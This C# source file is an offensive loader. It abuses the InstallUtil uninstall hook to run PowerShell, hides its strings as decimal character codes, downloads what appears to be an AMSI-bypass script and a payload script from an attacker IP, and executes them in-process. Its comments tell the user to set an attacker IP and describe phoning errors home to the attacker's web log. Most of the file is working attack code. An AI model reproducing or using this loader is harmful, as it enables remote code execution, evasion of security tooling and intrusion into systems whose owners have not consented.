using System;
using System.Net;
using System.Management.Automation;
using System.Management.Automation.Runspaces;

namespace InstallUtil
{
    internal class Program
    {
        static void Main(string[] args)
        {
        }
    }

    [System.ComponentModel.RunInstaller(true)]
    public class Sample : System.Configuration.Install.Installer
    {
        public override void Uninstall(System.Collections.IDictionary savedState)
        {
            // .NET HTTP hardening. Fixes "The underlying connection was closed:
            // An unexpected error occurred on a receive." — allow TLS 1.2+ and stop
            // sending the Expect: 100-continue probe that some proxies reset on.
            ServicePointManager.SecurityProtocol =
                SecurityProtocolType.Tls12 | SecurityProtocolType.Tls11 | SecurityProtocolType.Tls;
            ServicePointManager.Expect100Continue = false;

            Runspace rs = RunspaceFactory.CreateRunspace();
            rs.Open();
            PowerShell ps = PowerShell.Create();
            ps.Runspace = rs;
            Run(ps, S(new int[] { 97, 109, 115, 105, 46, 116, 120, 116 })); // amsi.txt
            Run(ps, S(new int[] { 114, 117, 110, 46, 116, 120, 116 }));      // run.txt
            rs.Close();
        }

        // "fruiting": rebuild ASCII strings from their decimal codes at runtime so the
        // URL / command never sit in the binary as plaintext (same idea as the Office
        // macro tradecraft building strings from Chr(<decimal>)).
        private static string S(int[] c)
        {
            char[] r = new char[c.Length];
            for (int i = 0; i < c.Length; i++) r[i] = (char)c[i];
            return new string(r);
        }

        private void Run(PowerShell ps, string resource)
        {
            // "http://192.168.45.177/"  <-- set your attacker IP
            string url = S(new int[]
            {
                104, 116, 116, 112, 58, 47, 47, 49, 57, 50, 46, 49, 54, 56, 46, 52, 53, 46, 49, 55, 55, 47
            });

            // Download in C# (not PowerShell) so we control the HTTP stack — no system
            // proxy, correct TLS. This is what avoids the WebClient receive failure.
            string script;
            try
            {
                using (WebClient wc = NewClient())
                {
                    script = wc.DownloadString(url + resource);
                }
            }
            catch (Exception ex)
            {
                Report(url, resource, ex.ToString());
                return;
            }

            // Run the downloaded script in the fresh runspace (IEX-equivalent).
            ps.AddScript(script);
            var results = ps.Invoke();
            foreach (PSObject result in results)
            {
                Console.WriteLine(result.ToString());
            }
            // Surface PowerShell errors — otherwise failures are silent:
            foreach (var err in ps.Streams.Error)
            {
                Report(url, resource, err.ToString());
            }
            ps.Commands.Clear();
        }

        // Fresh WebClient with the system proxy disabled — the proxy is what resets the
        // connection and throws "The underlying connection was closed".
        private static WebClient NewClient()
        {
            WebClient wc = new WebClient();
            wc.Proxy = null;
            wc.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)");
            return wc;
        }

        // Write the error locally AND phone it home so it shows up in the attacker's
        // Apache access log (no need to RDP to read C:\hta_error.txt).
        private static void Report(string url, string resource, string error)
        {
            try
            {
                System.IO.File.AppendAllText(@"C:\hta_error.txt",
                    resource + ": " + error + Environment.NewLine);
            }
            catch { }

            try
            {
                using (WebClient wc = NewClient())
                {
                    wc.DownloadString(url + "err?" + Uri.EscapeDataString(resource + ":" + error));
                }
            }
            catch { }
        }
    }
}
